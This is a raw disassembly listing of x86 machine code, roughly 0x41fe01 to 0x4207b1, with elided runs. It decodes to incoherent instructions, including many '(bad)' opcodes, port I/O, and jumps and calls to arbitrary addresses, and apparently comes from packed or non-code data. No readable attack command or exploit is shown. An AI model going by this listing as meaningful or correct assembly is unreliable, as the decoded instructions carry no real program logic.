  41fe01:	out    0x56,eax
  41fe03:	outs   dx,DWORD PTR ds:[esi]
  41fe04:	dec    ebx
  41fe05:	jmp    0x41fe5a
  41fe07:	jns    0x41fe03
  41fe09:	retf   0xb414
  41fe0c:	add    al,0x72
  41fe0e:	jmp    0x41fe10
	...
  41fe28:	jbe    0x41fe0e
  41fe2a:	push   ebx
  41fe2b:	add    BYTE PTR [edi-0x25],dh
  41fe2e:	pop    edx
  41fe2f:	cld    
  41fe30:	ins    BYTE PTR es:[edi],dx
  41fe31:	or     eax,DWORD PTR [ecx+0x5]
  41fe34:	jge    0x41fe09
  41fe36:	lds    edx,FWORD PTR [ebx]
  41fe38:	jge    0x41fe06
  41fe3a:	sbb    eax,0xc4356ec3
  41fe3f:	cmp    BYTE PTR ds:0xb286de14,0x5
  41fe46:	out    0x3,eax
  41fe48:	sub    DWORD PTR [ecx],ebp
  41fe4a:	je     0x41fe8d
  41fe4c:	mov    BYTE PTR [esi-0x19],al
  41fe4f:	and    DWORD PTR [edx],0x34
  41fe52:	adc    ecx,DWORD PTR [esi]
  41fe54:	je     0x41fe34
  41fe56:	shl    BYTE PTR [edi-0x1d],1
  41fe59:	test   BYTE PTR [edi+0x7de7423],ch
  41fe5f:	push   DWORD PTR [ebp+0x69]
  41fe62:	call   0x5fc6f26a
  41fe67:	imul   edi,ecx,0xf404c18b
  41fe6d:	add    al,0xc1
  41fe6f:	pop    ss
  41fe70:	int    0x6
  41fe72:	ror    DWORD PTR ds:0xd470c82c,0x4b
  41fe79:	iret   
  41fe7a:	push   es
  41fe7b:	test   BYTE PTR [ebp-0x4744ff9b],bh
  41fe81:	arpl   dx,di
  41fe83:	mov    bl,0xb2
  41fe85:	mov    DWORD PTR [eax-0x18],eax
  41fe88:	test   DWORD PTR [eax+eax*4],0x20
	...
  41fea3:	add    BYTE PTR [eax],al
  41fea5:	int    0x11
  41fea7:	sbb    esi,0xfffffff0
  41feaa:	add    al,0x0
  41feac:	sub    esp,0x3c
  41feaf:	shr    DWORD PTR [ecx-0x68],0x30
  41feb3:	or     eax,0xfce3dd64
  41feb8:	jmp    0x2a99f9da
  41febd:	ja     0x41fe99
  41febf:	sub    al,0xf6
  41fec1:	jb     0x41fec1
  41fec3:	(bad)  
  41fec4:	call   0x31576dc0
  41fec9:	xor    eax,0xcb32f763
  41fece:	or     BYTE PTR [edx-0x1f],ch
  41fed1:	mov    edi,0xf4a889c5
  41fed6:	and    al,0x3c
  41fed8:	dec    eax
  41fed9:	(bad)  
  41feda:	or     BYTE PTR [ebx+esi*1],bh
  41fedd:	stos   BYTE PTR es:[edi],al
  41fede:	cld    
  41fedf:	jg     0x41fe81
  41fee1:	loopne 0x41ff43
  41fee3:	add    ebp,DWORD PTR [ecx+0xf]
  41fee6:	sbb    bh,BYTE PTR [esi-0x19]
  41fee9:	ja     0x41fec5
  41feeb:	sub    eax,0xf7630f15
  41fef0:	aam    0x8
  41fef2:	xchg   bl,ch
  41fef4:	jmp    0xd2ac03f0
  41fef9:	scas   eax,DWORD PTR es:[edi]
  41fefa:	lds    ecx,FWORD PTR [ecx+0x3c24f4a8]
  41ff00:	enter  0x965,0x3c
  41ff04:	jecxz  0x41ff6f
  41ff06:	aad    0x7f
  41ff08:	push   eax
	...
  41ff21:	add    BYTE PTR [eax],ah
  41ff23:	popa   
  41ff24:	add    ebp,DWORD PTR [ecx-0x21]
  41ff27:	sbb    edi,DWORD PTR [esi+0x0]
  41ff2a:	cmp    ecx,DWORD PTR [ecx-0x1876d10b]
  41ff30:	jl     0x41ff2b
  41ff32:	lock pop esp
  41ff34:	fadd   QWORD PTR [eax-0x7bf5001c]
  41ff3a:	test   ecx,esi
  41ff3c:	sti    
  41ff3d:	dec    DWORD PTR ds:0x907436ee
  41ff43:	xchg   ch,dh
  41ff45:	aas    
  41ff46:	mov    dl,0x8b
  41ff48:	lods   eax,DWORD PTR ds:[esi]
  41ff49:	add    BYTE PTR [ebp+0x551f6a06],bl
  41ff4f:	lds    esp,FWORD PTR [esi+0x1c]
  41ff52:	lds    edi,FWORD PTR gs:[ecx+edi*8-0x80]
  41ff57:	pop    ebx
  41ff58:	add    al,0x6a
  41ff5a:	not    DWORD PTR [eax-0x41]
  41ff5d:	adc    BYTE PTR [esi+edx*1+0x7c],0x5
  41ff62:	int    0xee
  41ff64:	xor    eax,0xbe5c487e
  41ff69:	or     al,0xfd
  41ff6b:	adc    al,0x5d
  41ff6d:	jb     0x41ffc8
  41ff6f:	xor    ah,BYTE PTR [esi+0x76]
  41ff72:	push   esp
  41ff73:	xchg   ch,dh
  41ff75:	cmp    dl,BYTE PTR [edx-0x75]
  41ff78:	jge    0x41ff7a
  41ff7a:	sbb    eax,0xb5196a06
  41ff7f:	ret    
  41ff80:	jl     0x41ff7b
  41ff82:	xor    ah,cl
  41ff84:	sbb    BYTE PTR ds:0x0,0x0
	...
  41ff9f:	xor    cl,0xfb
  41ffa2:	xor    BYTE PTR [ecx+esi*1+0x74],0xbe
  41ffa7:	lea    edi,[esi-0x217b7fd4]
  41ffad:	jae    0x420016
  41ffaf:	not    DWORD PTR [ecx]
  41ffb1:	pop    eax
  41ffb2:	ret    
  41ffb3:	loop   0x41ff4c
  41ffb5:	int    0x80
  41ffb7:	xchg   edi,eax
  41ffb8:	int    0x69
  41ffba:	inc    eax
  41ffbb:	hlt    
  41ffbc:	jmp    0x41ffbe
  41ffbe:	jae    0x41ffee
  41ffc0:	ins    BYTE PTR es:[edi],dx
  41ffc1:	jmp    0x1c1f:0x57644120
  41ffc8:	das    
  41ffc9:	cld    
  41ffca:	mov    ch,0xb5
  41ffcc:	imul   ebp,DWORD PTR [ecx+0xac21d7],0x0
  41ffd3:	and    al,dh
  41ffd5:	push   esi
  41ffd6:	and    BYTE PTR [edi+ebp*1],bh
  41ffd9:	xor    esi,0x7fe37fd7
  41ffdf:	(bad)  
  41ffe0:	shl    BYTE PTR [ebp+0x34],cl
  41ffe3:	lahf   
  41ffe4:	(bad)  
  41ffe6:	mov    ch,0xa5
  41ffe8:	imul   esp,DWORD PTR [edi+0xac09d7],0x0
  41ffef:	call   0xcc6456db
  41fff4:	scas   al,BYTE PTR es:[edi]
  41fff5:	xor    esi,0x17
  41fff8:	cmp    BYTE PTR [eax+eax*4],ah
  41fffb:	pop    ebp
  41fffc:	cli    
  41fffd:	outs   dx,BYTE PTR ds:[esi]
  41fffe:	sbb    BYTE PTR [edi-0x45],bl
  420001:	clc    
  420002:	mov    ch,0x0
	...
  42001c:	and    eax,0xd1d7ae6b
  420021:	sub    eax,DWORD PTR [eax+eax*1]
  420024:	shr    eax,0x80
  420027:	not    bh
  420029:	pop    ss
  42002a:	cld    
  42002b:	jg     0x42005a
  42002d:	jmp    0xc143:0xabe7016c
  420034:	imul   esp,DWORD PTR [esp+eax*1],0x42c66bf
  42003b:	call   0x8462ca6
  420040:	addr16 sub al,0x4
  420043:	adc    esp,DWORD PTR [edi+0x2c]
  420046:	add    al,0x22
  420048:	xchg   DWORD PTR ds:0x5879904,ebp
  42004e:	test   al,0x3
  420050:	xchg   BYTE PTR [edi+eiz*4+0x3],dh
  420054:	gs je  0x41fffe
  420057:	add    esp,DWORD PTR ds:0xb803a774
  42005d:	je     0x420006
  42005f:	add    eax,DWORD PTR [edx-0x63fc588c]
  420065:	je     0x42000e
  420067:	add    ebx,DWORD PTR [edi-0x60fc588c]
  42006d:	je     0x420016
  42006f:	add    edi,ebx
  420071:	js     0x42001a
  420073:	add    edx,edi
  420075:	js     0x42001e
  420077:	add    esp,DWORD PTR [edi]
  420079:	mov    edx,?
  42007b:	xchg   BYTE PTR [edi+0xd869dd],dl
	...
  420099:	iret   
  42009a:	mov    ebp,DWORD PTR [ebx-0x6c73daed]
  4200a0:	sti    
  4200a1:	leave  
  4200a2:	mov    esi,esi
  4200a4:	ss xor al,0x8e
  4200a7:	sub    ah,BYTE PTR [eax]
  4200a9:	cld    
  4200aa:	lea    esp,[edx]
  4200ac:	and    BYTE PTR [esi+ecx*4],al
  4200af:	sub    ah,BYTE PTR [eax]
  4200b1:	lock lea esp,[edx]
  4200b4:	and    al,ah
  4200b6:	mov    ch,BYTE PTR [ebx+edx*1]
  4200b9:	ins    BYTE PTR es:[edi],dx
  4200ba:	dec    ecx
  4200bb:	add    edi,edi
  4200bd:	mov    ebx,0xb0ff0b68
  4200c2:	aaa    
  4200c3:	bound  ebp,QWORD PTR [eax-0x8]
  4200c6:	pop    eax
  4200c7:	out    dx,al
  4200c8:	ss xor al,0xee
  4200cb:	sbb    dl,BYTE PTR ds:0xbc6c04f4
  4200d1:	xchg   BYTE PTR [ecx+0x61],cl
  4200d4:	cmp    DWORD PTR [ebx],ecx
  4200d6:	test   BYTE PTR [edi+0x7f84d16f],ch
  4200dc:	add    eax,0x68ffed82
  4200e1:	loopne 0x4200e6
  4200e3:	je     0x42006a
  4200e5:	ja     0x4200bd
  4200e7:	push   cs
  4200e8:	(bad)  [esi+0x651cf75f]
  4200ee:	dec    BYTE PTR [eax-0x407c0056]
  4200f4:	aad    0xa2
  4200f6:	mov    ebp,cs
  4200f8:	inc    esi
  4200f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200fa:	cmp    BYTE PTR [edi+0xb5],0x0
	...
  420115:	add    BYTE PTR [edx-0x73],bh
  420118:	inc    ebp
  420119:	ficom  WORD PTR [ebx]
  42011b:	mov    cl,BYTE PTR [ebx]
  42011d:	out    0x2f,al
  42011f:	dec    edx
  420120:	adc    eax,0x88234e12
  420125:	in     eax,dx
  420126:	lahf   
  420127:	xchg   DWORD PTR [ebp-0x2],eax
  42012a:	retf   0x3fc4
  42012d:	add    dl,al
  42012f:	verw   cx
  420132:	add    DWORD PTR [edx-0x1],ecx
  420135:	mov    esp,0x600453dd
  42013a:	fld    TBYTE PTR [eax]
  42013c:	sbb    al,0xad
  42013e:	daa    
  42013f:	push   esp
  420140:	add    al,0x70
  420142:	int3   
  420143:	sub    BYTE PTR [ecx*1+0x5e0e2104],dl
  42014a:	hlt    
  42014b:	xchg   DWORD PTR [ebx+0x5],edi
  42014e:	adc    BYTE PTR [ebx+eax*1+0x245bbef6],cl
  420155:	fnstcw WORD PTR [esi-0x1ef2dbbd]
  42015b:	fmul   QWORD PTR [eiz*2-0x16ffee33]
  420162:	ja     0x4201c5
  420164:	jmp    eax
  420166:	cdq    
  420167:	add    BYTE PTR [ebp-0x7],dh
  42016a:	sbb    al,0x49
  42016c:	add    al,0x68
  42016e:	sahf   
  42016f:	or     BYTE PTR [eax],al
  420171:	add    ch,cl
  420173:	add    eax,DWORD PTR [eax]
  420175:	setb   BYTE PTR [ecx+0xb]
	...
  420190:	add    BYTE PTR [eax],al
  420192:	add    ch,bl
  420194:	popa   
  420195:	jp     0x42019f
  420197:	retf   0x4294
  42019a:	add    DWORD PTR [ebp-0x35c20b77],esp
  4201a0:	test   DWORD PTR [ebx],ebx
  4201a2:	adc    ch,bl
  4201a4:	add    bh,bl
  4201a6:	and    al,0x50
  4201a8:	inc    ebx
  4201a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201aa:	inc    ecx
  4201ab:	int    0x82
  4201ad:	test   DWORD PTR ds:0xf1c5eca,0xfb80029d
  4201b7:	xchg   edi,eax
  4201b8:	fld    QWORD PTR [eax+0x2aa16]
  4201be:	xor    BYTE PTR [ebx-0x6ab180f7],0xed
  4201c5:	jg     0x420215
  4201c7:	test   eax,0xd0686ed
  4201cc:	lock inc esp
  4201ce:	movups XMMWORD PTR [eax-0x1a20003],xmm7
  4201d5:	sti    
  4201d6:	mov    BYTE PTR [ebx-0x3c],dl
  4201d9:	inc    edx
  4201da:	add    DWORD PTR [ecx+eax*8-0x4b],ebx
  4201de:	adc    BYTE PTR [esi-0x29],0xb
  4201e2:	test   BYTE PTR [ebx-0x22fffffb],bl
  4201e8:	lock push es
  4201ea:	(bad)  
  4201ec:	fwait
  4201ed:	add    eax,DWORD PTR [eax]
  4201ef:	dec    ebp
  4201f0:	les    eax,FWORD PTR [edx+0x1]
  4201f3:	xor    al,cl
  4201f5:	popf   
  4201f6:	add    BYTE PTR [eax],0x0
	...
  42020d:	add    BYTE PTR [eax],al
  42020f:	add    BYTE PTR [esi-0x29],ah
  420212:	or     eax,DWORD PTR [esp+ecx*2-0x72000320]
  420219:	lock push es
  42021b:	pmuludq mm6,QWORD PTR [eax-0x2e]
  42021f:	or     esp,esi
  420221:	jmp    0x4201a6
  420223:	jnp    0x4201fd
  420225:	mov    edi,0xecb2c600
  42022a:	xor    dh,BYTE PTR [eax+edi*2+0x62]
  42022e:	inc    eax
  42022f:	or     al,0x71
  420231:	stos   DWORD PTR es:[edi],eax
  420232:	ins    BYTE PTR es:[edi],dx
  420233:	sub    al,0x6f
  420235:	lahf   
  420236:	sbb    al,0x14
  420238:	outs   dx,DWORD PTR ds:[esi]
  420239:	scas   eax,DWORD PTR es:[edi]
  42023a:	sbb    al,0x10
  42023c:	pop    ds
  42023d:	and    dl,BYTE PTR [edx-0x77]
  420240:	mov    edx,0xb482d14e
  420245:	lahf   
  420246:	cli    
  420247:	mov    DWORD PTR [edx],esi
  420249:	mov    bh,0x1c
  42024b:	test   BYTE PTR [eax],al
  42024d:	lock js 0x420295
  420250:	add    esp,DWORD PTR [edx+0x3f]
  420253:	adc    eax,0x4378a6d8
  420258:	shr    dh,1
  42025a:	test   DWORD PTR [edx+0xeb77],0x141c8777
  420264:	hlt    
  420265:	hlt    
  420266:	aas    
  420267:	std    
  420268:	jnp    0x420248
  42026a:	cmp    eax,0x47ce714
  420270:	clc    
  420271:	jmp    0x420273
  420273:	add    BYTE PTR [eax],0x0
	...
  42028a:	add    BYTE PTR [eax],al
  42028c:	add    BYTE PTR [edi-0x2c],bl
  42028f:	cmc    
  420290:	sbb    DWORD PTR [edx-0x2e],0x0
  420294:	add    BYTE PTR [edx],bh
  420296:	sub    eax,0xdf5d2b03
  42029b:	in     eax,0xfc
  42029d:	inc    ebx
  42029e:	imul   ebp,ecx,0x9
  4202a1:	jmp    0x42030b
  4202a3:	dec    ebp
  4202a4:	add    esp,esi
  4202a6:	jmp    0x42031e
  4202a8:	add    eax,0xa801c334
  4202ad:	in     al,dx
  4202ae:	add    al,0xf6
  4202b0:	adc    BYTE PTR [ebx],0x9
  4202b3:	out    0x3,eax
  4202b5:	cmp    al,BYTE PTR [esi-0x18]
  4202b8:	sub    ebx,DWORD PTR [esp+esi*8+0x13]
  4202bc:	cli    
  4202bd:	sbb    DWORD PTR [esi-0x23],0x0
  4202c1:	or     BYTE PTR [eax],0xba
  4202c4:	ret    
  4202c5:	fmul   QWORD PTR [eax]
  4202c7:	mov    edx,0x86c52bc3
  4202cc:	(bad)  
  4202cd:	in     eax,dx
  4202ce:	inc    eax
  4202cf:	or     esi,edi
  4202d1:	jae    0x420316
  4202d3:	idiv   BYTE PTR [edx+0x38]
  4202d6:	cmc    
  4202d7:	imul   eax,esp,0x47
  4202da:	clc    
  4202db:	popa   
  4202dc:	mov    dh,0xc0
  4202de:	mov    ch,0x69
  4202e0:	fdivr  QWORD PTR [ebx+0x13bf158]
  4202e6:	add    BYTE PTR [ecx+0x66dcabf6],0xf6
  4202ed:	and    ecx,DWORD PTR [edi+0xeac]
	...
  420307:	add    BYTE PTR [eax],al
  420309:	add    al,dl
  42030b:	pop    ebx
  42030c:	outs   dx,DWORD PTR ds:[esi]
  42030d:	inc    eax
  42030e:	fmul   DWORD PTR [ebx]
  420310:	out    0x7f,al
  420312:	mov    ecx,0x6ce70ddb
  420317:	inc    ecx
  420318:	retf   
  420319:	adc    ecx,ebp
  42031b:	inc    ecx
  42031c:	jmp    0x4202fa
  42031e:	popf   
  42031f:	or     al,0xe7
  420321:	add    edi,DWORD PTR [ebp+0x42]
  420324:	fistp  DWORD PTR [edx]
  420326:	mov    eax,0xa97af720
  42032b:	or     dl,ch
  42032d:	inc    eax
  42032e:	in     al,0x7d
  420330:	popa   
  420331:	jmp    0x1c4544a8
  420336:	ins    DWORD PTR es:[edi],dx
  420337:	inc    ebx
  420338:	out    dx,eax
  420339:	sub    ch,BYTE PTR [ecx]
  42033b:	push   esp
  42033c:	xlat   BYTE PTR ds:[ebx]
  42033d:	jno    0x420339
  42033f:	pop    ds
  420340:	add    BYTE PTR ds:0xe1712cd4,ch
  420346:	sahf   
  420347:	retf   
  420348:	xchg   BYTE PTR ds:0xf1e910d4,dh
  42034e:	mov    ?,WORD PTR [edi]
  420350:	and    al,0xc1
  420352:	mov    BYTE PTR [edi+0x24],bl
  420355:	aad    0x76
  420357:	pusha  
  420358:	and    al,0xe1
  42035a:	not    DWORD PTR [edi+0x8]
  42035d:	jb     0x4203ba
  42035f:	and    DWORD PTR [eax],edx
  420361:	pusha  
  420362:	push   ebx
  420363:	and    DWORD PTR [eax],ebx
  420365:	ret    0xfcb5
  420368:	dec    ebx
  420369:	or     eax,0xf1458424
	...
  420386:	add    BYTE PTR [esi+0x48],cl
  420389:	and    al,0xf9
  42038b:	dec    esp
  42038c:	dec    eax
  42038d:	adc    BYTE PTR [esi+0x40],cl
  420390:	dec    eax
  420391:	and    al,0xd9
  420393:	ds inc edx
  420395:	or     dl,dh
  420397:	mov    eax,0xa2e54d82
  42039c:	xchg   BYTE PTR [ecx-0x39fb0824],bl
  4203a2:	scas   eax,DWORD PTR es:[edi]
  4203a3:	lock sbb dh,BYTE PTR [edi]
  4203a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203a7:	repz cld 
  4203a9:	or     al,0x6d
  4203ab:	ret    
  4203ac:	(bad)  
  4203ae:	push   cs
  4203af:	(bad)  
  4203b0:	pop    esi
  4203b1:	or     BYTE PTR [edx-0x46],dh
  4203b4:	lock sub BYTE PTR [ecx],0xe3
  4203b8:	das    
  4203b9:	mov    DWORD PTR [ebp-0x627702f5],ebx
  4203bf:	add    esi,ebp
  4203c1:	sub    BYTE PTR [ebx-0x5076b449],dh
  4203c7:	pop    ecx
  4203c8:	retf   
  4203c9:	sub    BYTE PTR [ecx+0x278a0ec4],0xf1
  4203d0:	and    BYTE PTR [esi-0x7b26bf00],al
  4203d6:	inc    esi
  4203d7:	dec    edx
  4203d8:	pop    ebp
  4203d9:	inc    ebx
  4203da:	pop    ss
  4203db:	stc    
  4203dc:	popa   
  4203dd:	mov    BYTE PTR [ecx+edi*8-0x2f],al
  4203e1:	or     eax,DWORD PTR [ebp-0x41e19]
  4203e7:	sahf   
  4203e8:	fs and al,0x18
	...
  420403:	add    BYTE PTR ds:0x72fe0abe,bl
  420409:	loope  0x420487
  42040b:	sti    
  42040c:	add    al,dl
  42040e:	add    BYTE PTR [edx-0x20],0x6
  420412:	add    BYTE PTR [eax-0x7bf4209a],al
  420418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420419:	sar    esp,cl
  42041b:	jmp    DWORD PTR [edi+0x1b]
  42041e:	adc    esp,DWORD PTR [edi+eax*2]
  420421:	fld    QWORD PTR [esi]
  420423:	jmp    0x3ed721
  420428:	sbb    ebx,DWORD PTR [ebx]
  42042a:	std    
  42042b:	add    al,BYTE PTR [esi+0x20]
  42042e:	cmp    edi,0xd1c5aa2
  420434:	popf   
  420435:	push   es
  420436:	xchg   esi,ecx
  420438:	rol    bh,cl
  42043a:	add    eax,0x4686dc79
  420440:	mov    bh,dl
  420442:	jl     0x420450
  420444:	pushf  
  420445:	pop    esi
  420446:	inc    ebx
  420447:	pop    ss
  420448:	pop    ss
  420449:	sbb    edx,DWORD PTR [ebx]
  42044b:	and    al,0x72
  42044d:	pop    esi
  42044e:	inc    ecx
  42044f:	and    al,0x62
  420451:	rol    DWORD PTR [eax+0x651fe],1
  420457:	mov    ebx,DWORD PTR [ecx+0x82b0ffa]
  42045d:	fnstsw WORD PTR [ecx+ebp*8]
  420460:	ror    edi,1
  420462:	cld    
  420463:	push   esp
  420465:	imul   ebp,eax,0x53
	...
  420480:	add    cl,cl
  420482:	in     eax,0x76
  420484:	add    eax,0xfef4c110
  420489:	jnp    0x42046d
  42048b:	xlat   BYTE PTR ds:[ebx]
  42048c:	dec    edx
  42048d:	je     0x420426
  42048f:	cmp    eax,0xf52c790d
  420494:	call   FWORD PTR [ebx]
  420496:	ins    BYTE PTR es:[edi],dx
  420497:	sbb    edi,esp
  420499:	cmp    ah,BYTE PTR [edx]
  42049b:	push   cs
  42049c:	add    dh,BYTE PTR [edx]
  42049e:	sub    bh,bh
  4204a0:	add    DWORD PTR [edx],edi
  4204a2:	and    al,BYTE PTR [ecx]
  4204a4:	adc    cl,BYTE PTR ds:0xf3fff4a9
  4204aa:	imul   ebx,DWORD PTR [ebx],0x1
  4204ad:	ja     0x4204d0
  4204af:	cld    
  4204b0:	cld    
  4204b1:	ja     0x4204ac
  4204b3:	idiv   esp
  4204b5:	je     0x42051d
  4204b7:	div    DWORD PTR [ebx-0x80]
  4204ba:	imul   ebp,eax,0xa
  4204bd:	inc    eax
  4204be:	imul   eax,DWORD PTR [ecx+0x7dbb2cf8],0xd
  4204c5:	jmp    0x3b0805b5
  4204ca:	in     eax,dx
  4204cb:	std    
  4204cc:	out    0x21,al
  4204ce:	adc    esp,esp
  4204d0:	cld    
  4204d1:	je     0x4204e9
  4204d3:	dec    ebp
  4204d4:	or     eax,0x24f71
  4204d9:	hlt    
  4204da:	and    DWORD PTR [ebx],edi
  4204dc:	push   ecx
  4204de:	add    al,0x75
  4204e0:	or     esi,esp
  4204e2:	jmp    0x420464
  4204e4:	clc    
	...
  4204fd:	add    BYTE PTR [eax],ah
  4204ff:	sar    DWORD PTR [ebp+0x79],cl
  420502:	cmc    
  420503:	jmp    0x420505
  420505:	(bad)  
  420506:	mov    dl,0xec
  420508:	sti    
  420509:	out    0xde,al
  42050b:	mov    bh,0x0
  42050d:	add    BYTE PTR [esp+eax*1-0x1e],dh
  420511:	xor    al,0x1
  420513:	or     BYTE PTR [esi+0x5],0xf4
  420517:	add    al,0xad
  420519:	dec    edx
  42051a:	inc    ebx
  42051b:	add    eax,eax
  42051d:	ins    BYTE PTR es:[edi],dx
  42051e:	call   0x2cc5ec27
  420523:	sub    esi,ebp
  420525:	mov    cl,al
  420527:	add    esp,edi
  420529:	add    edi,DWORD PTR [edx]
  42052b:	inc    edx
  42052c:	call   0xf374183d
  420531:	add    esi,esp
  420533:	xchg   DWORD PTR [ecx],ebp
  420535:	mov    ah,0xcf
  420537:	or     ebx,DWORD PTR [esi]
  420539:	ss call 0x8e85:0x91c74d09
  420541:	adc    al,0x5a
  420543:	mov    fs,WORD PTR [esp+esi*8]
  420546:	mov    cl,0x3f
  420548:	call   0xdb5de05a
  42054d:	add    esi,esp
  42054f:	test   BYTE PTR [ecx+0x32],ah
  420552:	inc    edi
  420553:	push   cs
  420554:	and    eax,0x400bcb4a
  420559:	xor    al,dh
  42055b:	add    al,0xe7
  42055d:	cmp    DWORD PTR [ebp+edx*1+0x2dc3],0x0
	...
  420579:	add    BYTE PTR [eax],al
  42057b:	je     0x420559
  42057d:	jmp    DWORD PTR [edx-0x29]
  420580:	pop    esi
  420581:	bound  ecx,QWORD PTR [edx+0x4]
  420584:	pop    edi
  420585:	ret    0xedc3
  420588:	pop    esi
  420589:	mul    BYTE PTR [ecx-0x3b15a044]
  42058f:	adc    DWORD PTR [esi+edi*8-0x5b71e5ed],eax
  420596:	repz inc edx
  420598:	loopne 0x420583
  42059a:	add    esi,esp
  42059c:	pop    esi
  42059d:	ret    0xf8c4
  4205a0:	jle    0x4205a1
  4205a2:	repz repnz add al,0x0
  4205a6:	arpl   WORD PTR [esi+0x37223f1],bp
  4205ac:	push   cs
  4205ad:	out    0xd1,eax
  4205af:	sti    
  4205b0:	add    al,0x0
  4205b2:	fs mov edx,0x9ee03bb4
  4205b8:	jmp    0x42061f
  4205ba:	not    BYTE PTR [ebp-0x3b]
  4205bd:	gs push 0x1f
  4205c0:	sub    BYTE PTR [esi+0x60],ah
  4205c3:	lods   eax,DWORD PTR ds:[esi]
  4205c4:	repnz lds esp,FWORD PTR [edi]
  4205c7:	icebp  
  4205c8:	or     bh,ah
  4205ca:	mov    esp,0x69000502
  4205cf:	sub    bh,al
  4205d1:	jb     0x4205b3
  4205d3:	sub    eax,0x8dbff42
  4205d8:	ror    DWORD PTR [eax],0xe9
  4205db:	test   DWORD PTR [eax+edi*8+0xb9],0x0
	...
  4205f6:	add    BYTE PTR [eax],al
  4205f8:	dec    ebx
  4205f9:	les    edi,FWORD PTR [edi+0x72]
  4205fc:	add    BYTE PTR [edx-0x40],bl
  4205ff:	pop    es
  420600:	imul   eax,DWORD PTR [ecx+0x12],0xffffffcf
  420604:	(bad)  
  420605:	lds    ecx,FWORD PTR [ecx]
  420607:	(bad)  
  420608:	out    0x96,al
  42060a:	enter  0xfacf,0x97
  42060e:	gs push 0xffffffcf
  420611:	daa    
  420612:	data16 jo 0x420652
  420615:	repz call 0xd0868a7b
  42061b:	cmc    
  42061c:	lock push ecx
  42061e:	adc    eax,edi
  420620:	push   es
  420621:	xchg   edi,eax
  420622:	ror    BYTE PTR [edi-0x78d02086],0x78
  420629:	inc    ecx
  42062a:	adc    al,0x2f
  42062c:	sub    eax,0x6f000ad8
  420631:	or     al,0x0
  420633:	add    BYTE PTR [ebp-0x7d],bl
  420636:	mul    DWORD PTR [eax]
  420638:	pop    edx
  420639:	jg     0x4206b6
  42063b:	or     ecx,DWORD PTR [ebp+0x3]
  42063e:	mov    al,BYTE PTR [esi+0x42]
  420641:	pop    ds
  420642:	mov    WORD PTR [ecx+ecx*2],cs
  420645:	jmp    0x4389:0x35d0c66
  42064c:	jge    0x420672
  42064e:	add    eax,0x876af377
  420653:	inc    esi
  420654:	push   ecx
  420655:	ins    DWORD PTR es:[edi],dx
  420656:	shl    BYTE PTR [bx],0x6d
  42065a:	or     edi,DWORD PTR [esi+0x0]
	...
  420674:	add    BYTE PTR [esi+0x6a],dl
  420677:	inc    eax
  420679:	mov    bl,0x81
  42067b:	in     al,0x30
  42067d:	xchg   esp,eax
  42067e:	in     eax,dx
  42067f:	(bad)  
  420680:	call   FWORD PTR ds:0x146856d
  420686:	ins    DWORD PTR es:[edi],dx
  420687:	aaa    
  420688:	shl    edx,0xb4
  42068b:	in     eax,0x46
  42068d:	out    0x2,al
  42068f:	add    BYTE PTR [eax+0x2a740776],al
  420695:	dec    ebp
  420696:	mov    eax,0x82be7409
  42069b:	mul    DWORD PTR [eax]
  42069d:	mov    al,0x7a
  42069f:	ret    0xdc46
  4206a2:	cmc    
  4206a3:	in     al,0x2e
  4206a5:	(bad)  
  4206a6:	add    al,BYTE PTR [eax]
  4206a8:	and    BYTE PTR [esi],0x6
  4206ab:	jno    0x4206b6
  4206ad:	jecxz  0x4206f9
  4206af:	std    
  4206b0:	cmove  esp,DWORD PTR [ecx]
  4206b3:	pop    es
  4206b4:	add    BYTE PTR [ebp-0x45f5087e],cl
  4206ba:	jg     0x4206cf
  4206bc:	or     ebx,DWORD PTR [ebp-0x63b939fe]
  4206c2:	daa    
  4206c3:	in     eax,0xe
  4206c5:	hlt    
  4206c6:	loop   0x4206c8
  4206c8:	add    BYTE PTR [ebx+esi*8+0xd],dh
  4206cc:	je     0x420734
  4206ce:	push   edx
  4206cf:	dec    edx
  4206d0:	adc    eax,0x1a106210
  4206d5:	dec    ebp
  4206d6:	fmul   DWORD PTR [ebx]
	...
  4206f0:	add    BYTE PTR [eax],al
  4206f2:	hlt    
  4206f3:	imul   ebx,ebx,0xa
  4206f6:	add    ebp,DWORD PTR [eax-0x2b]
  4206f9:	or     esp,esi
  4206fb:	jmp    0x42067d
  4206fd:	clc    
  4206fe:	out    dx,al
  4206ff:	fiadd  WORD PTR [eax+ebp*8-0x7fff1412]
  420706:	(bad)  
  420708:	or     DWORD PTR [ebp-0x4],0xffffff96
  42070c:	or     DWORD PTR [ebp-0x10],0xffffff8e
  420710:	mov    al,al
  420712:	call   0x3a12722
  420717:	push   0x48
  420719:	or     esp,esi
  42071b:	jmp    0x420739
  42071d:	jp     0x420712
  42071f:	data16 and BYTE PTR [ecx],cl
  420722:	hlt    
  420723:	jmp    0x420734
  420725:	mov    esi,0x1646a5b7
  42072a:	hlt    
  42072b:	popf   
  42072c:	inc    esi
  42072d:	add    ebp,esi
  42072f:	push   0xffffffd9
  420731:	dec    ebp
  420732:	pop    ebx
  420733:	and    al,0x58
  420735:	inc    eax
  420736:	ja     0x42076b
  420738:	inc    esp
  420739:	je     0x42073c
  42073b:	xchg   esp,eax
  42073c:	push   esp
  42073d:	sub    al,0x77
  42073f:	inc    ebx
  420740:	add    al,0x74
  420742:	adc    eax,0x771854a4
  420747:	xor    eax,DWORD PTR ds:0xf93f974
  42074d:	add    DWORD PTR ds:0xb20000e3,0xffffff9d
  420754:	test   BYTE PTR [ecx],0x0
	...
  42076f:	lahf   
  420770:	add    al,0xc6
  420772:	leave  
  420773:	xor    edi,ebp
  420775:	out    dx,eax
  420776:	in     al,dx
  420777:	sub    bh,BYTE PTR [edi-0x160a0654]
  42077d:	mov    ecx,0xe7eeb9c9
  420782:	in     al,dx
  420783:	mov    esi,0x63f9a4be
  420788:	jmp    0xece3:0xeeb1c9ad
  42078f:	adc    bh,BYTE PTR [edi-0x161909d4]
  420795:	and    DWORD PTR [ebx+0x125b455b],eax
  42079b:	lods   al,BYTE PTR ds:[esi]
  42079c:	push   eax
  42079d:	add    BYTE PTR [esp+edi*4+0x50],cl
  4207a1:	out    0x4b,al
  4207a3:	mov    al,ds:0xef582eee
  4207a8:	dec    esp
  4207a9:	out    0x88,al
  4207ab:	sub    DWORD PTR [edx],ecx
  4207ad:	out    0x3,eax
  4207af:	cmp    bh,BYTE PTR [esi]
  4207b1:	std    
